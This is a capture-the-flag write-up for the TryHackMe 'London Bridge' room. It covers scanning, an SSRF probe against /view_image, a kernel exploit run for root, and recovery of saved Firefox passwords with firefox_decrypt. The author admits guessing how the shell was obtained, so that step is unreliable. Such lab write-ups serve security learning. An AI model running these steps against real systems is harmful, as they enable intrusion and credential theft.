@@ -1,0 +1,223 @@
+TryHackMe Writeup — London Bridge
+📌 Basic Information
+Room Name: London Bridge
+Platform: TryHackMe
+Difficulty: Medium
+Target IP: 10.49.171.47
+
+
+Goal: Gain user + root access
+
+
+🔍 1. Reconnaissance
+🔸 Nmap Scan
+nmap -sC -sV -oN nmap.txt 10.49.171.47
+🔸 Output
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
+8080/tcp open  http    Gunicorn
+🔸 Key Observations
+Port 22 (SSH) → Possible login later
+Port 8080 (HTTP) → Main attack surface
+Gunicorn → Python backend (Flask/Django likely)
+
+
+
+🌐 2. Web Enumeration
+🔸 Access Web App
+http://10.49.171.47:8080
+
+Page Title:
+
+Explore London
+🔸 Directory & Endpoint Discovery
+
+Used fuzzing tools (ffuf / gobuster):
+
+ffuf -u http://10.49.171.47:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
+Discovered Endpoints:
+/feedback → returns 405
+/contact
+/gallery
+/upload
+/view_image ⚠️ IMPORTANT
+
+
+
+🚨 3. SSRF Vulnerability
+🔸 Target Endpoint
+/view_image
+🔸 Testing Behavior
+
+Tried manipulating parameters (example):
+
+http://10.49.171.47:8080/view_image?image=http://127.0.0.1
+🔸 Observations
+Internal responses returned
+500 Internal Server Error reveals backend behavior
+Able to access internal paths
+🔸 Internal Enumeration via SSRF
+
+Discovered hidden paths:
+
+/templates
+/static
+/upload
+
+👉 This confirms Server-Side Request Forgery (SSRF)
+
+🔸 Why SSRF is Critical
+Access internal-only endpoints
+Bypass firewall restrictions
+Reveal hidden directories
+Leak sensitive data
+
+
+
+
+🔑 4. Sensitive Information Disclosure
+
+While exploring files via SSRF / directories:
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp...
+beth@london
+🔸 Key Finding
+Username identified → beth
+
+
+
+🖥️ 5. Initial Foothold
+
+We obtained shell access as:
+
+beth@london
+
+(Access method depends on room flow — could be via upload/command injection/SSRF chaining)
+
+
+
+🏁 6. User Flag
+🔸 Locate Flag
+find / -type f -name "user.txt" 2>/dev/null
+🔸 Result
+/home/beth/user.txt
+🔸 Read Flag
+cat /home/beth/user.txt
+
+
+
+📈 7. Privilege Escalation
+🔸 Step 1 — System Enumeration
+
+Upload and run:
+
+linpeas.sh
+🔸 Key Finding
+Kernel: 4.15.0-112-generic
+
+👉 Known vulnerable kernel → public exploits available
+
+
+⚙️ 8. Exploit Compilation
+
+We used a local exploit (shell.c)
+
+❌ Initial Error
+gcc shell.c -o shell
+
+Error:
+
+undefined reference to pthread_create
+🔧 Fix
+
+Compile with pthread:
+
+gcc shell.c -o shell -pthread
+✅ Successful Compilation
+./shell
+
+Output:
+
+USAGE: ./exploit <rhel|centos|ubuntu>
+
+
+
+🚀 9. Exploitation
+
+Run exploit:
+
+./shell ubuntu
+🔸 Output
+[+] Found kernel '4.15.0-112-generic'
+[!] need at least 3 cores ideally, found 2
+[+] UAF seems to have hit
+[+] Payload ran correctly, spawning shell
+
+
+🔓 10. Root Access
+whoami
+Output:
+root
+
+
+🏁 11. Root Flag
+cat /root/root.txt
+
+
+
+
+🔍 12. Post-Exploitation — Credential Dumping
+🔸 Found Directory
+/home/charles/.mozilla/firefox/
+🔸 Why Important?
+
+Firefox stores:
+
+Saved passwords
+Cookies
+Credentials
+🔸 Tool Used
+  https://github.com/unode/firefox_decrypt.git
+🔸 Steps
+  git clone https://github.com/unode/firefox_decrypt.git
+  cd firefox_decrypt
+  python3 firefox_decrypt.py
+🔸 Result
+  Extracted stored credentials
+  Retrieved password for user charles
+
+
+🧠 13. Full Attack Chain
+Nmap scan → Identify services
+Web fuzzing → Discover endpoints
+SSRF in /view_image
+Internal directory discovery
+SSH key leak → user beth
+Gain shell access
+Find user flag
+Run linpeas → vulnerable kernel
+Compile exploit (-pthread)
+Run exploit → root shell
+Read root flag
+Extract Firefox credentials → charles password
+
+
+🔥 14. Key Learnings
+🔹 SSRF = Deep Access
+Always test:
+/view
+/image
+/fetch
+/api
+🔹 Enumeration Wins Rooms
+Fuzz everything
+Check hidden paths
+Follow errors (500 = gold)
+🔹 Kernel Exploits Still Work
+Old kernels = easy privilege escalation
+🔹 Post Exploitation is Critical
+Check:
+.ssh
+.bash_history
+.mozilla
+config files
